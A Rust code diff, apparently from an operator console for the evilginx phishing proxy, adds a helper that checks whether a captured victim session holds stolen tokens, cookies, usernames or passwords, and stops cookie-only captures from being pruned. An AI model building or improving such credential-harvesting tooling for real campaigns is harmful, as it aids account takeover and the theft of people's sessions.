@@ -1016,6 +1016,32 @@ pub fn ignore_and_delete_capture(profile_id: &str, evilginx_session_id: i64) -> 
     })
 }
 
+/// True when a captured session carries anything worth keeping: any of the three
+/// evilginx token maps (`tokens`, `body_tokens`, `http_tokens`), a non-empty
+/// `custom` map, or a username/password. This is the single source of truth for
+/// the "does this capture have material" judgment so prune and export cannot
+/// drift apart (see issue #17, where prune only looked at `body_tokens`).
+pub(crate) fn capture_has_material(data: &Value) -> bool {
+    let obj_nonempty = |key: &str| {
+        data.get(key)
+            .and_then(|v| v.as_object())
+            .map(|m| !m.is_empty())
+            .unwrap_or(false)
+    };
+    let str_nonempty = |key: &str| {
+        data.get(key)
+            .and_then(|v| v.as_str())
+            .map(|s| !s.trim().is_empty())
+            .unwrap_or(false)
+    };
+    obj_nonempty("tokens")
+        || obj_nonempty("body_tokens")
+        || obj_nonempty("http_tokens")
+        || obj_nonempty("custom")
+        || str_nonempty("username")
+        || str_nonempty("password")
+}
+
 pub fn prune_empty_captures(profile_id: &str) -> AppResult<usize> {
     with_db(|conn| {
         let mut stmt = conn.prepare(
@@ -1031,22 +1057,10 @@ pub fn prune_empty_captures(profile_id: &str) -> AppResult<usize> {
         let now = now_iso();
         for (_id, sid, data_s) in rows {
             let data: Value = serde_json::from_str(&data_s).unwrap_or(Value::Null);
-            let user = data
-                .get("username")
-                .and_then(|v| v.as_str())
-                .unwrap_or("")
-                .trim();
-            let pass = data
-                .get("password")
-                .and_then(|v| v.as_str())
-                .unwrap_or("")
-                .trim();
-            let custom = data.get("custom").and_then(|v| v.as_object());
-            let tokens = data.get("body_tokens").and_then(|v| v.as_object());
-            let empty = user.is_empty()
-                && pass.is_empty()
-                && custom.map(|c| c.is_empty()).unwrap_or(true)
-                && tokens.map(|t| t.is_empty()).unwrap_or(true);
+            // Prune only when the capture has no material in ANY token map or
+            // credential field. Previously this looked at `body_tokens` alone,
+            // so cookie-only captures (material in `tokens`) were wrongly pruned.
+            let empty = !capture_has_material(&data);
             if empty {
                 conn.execute(
                     "INSERT OR REPLACE INTO ignored_sessions(profile_id, evilginx_session_id, ignored_at)
